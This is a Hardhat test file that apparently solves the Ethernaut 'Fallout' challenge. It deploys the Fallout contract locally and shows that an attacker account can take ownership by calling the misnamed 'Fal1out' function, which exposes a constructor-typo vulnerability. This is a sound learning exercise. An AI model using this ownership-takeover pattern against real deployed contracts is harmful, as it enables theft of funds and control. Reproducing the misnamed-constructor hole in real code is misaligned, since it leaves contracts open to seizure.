import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Fallout } from "../../typechain";

describe("FalloutAttack", function () {
  let FalloutToken;
  let store: Fallout;
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;

  beforeEach(async function () {
    FalloutToken = await ethers.getContractFactory("Fallout");
    [owner, attacker] = await ethers.getSigners();
    store = await FalloutToken.connect(owner).deploy();
  });

  describe("attack", function () {
    it("should claim ownership", async function () {
      await store.connect(attacker).Fal1out();

      const storeOwner = await store.owner();
      expect(storeOwner).to.equals(attacker.address);
    });
  });
});
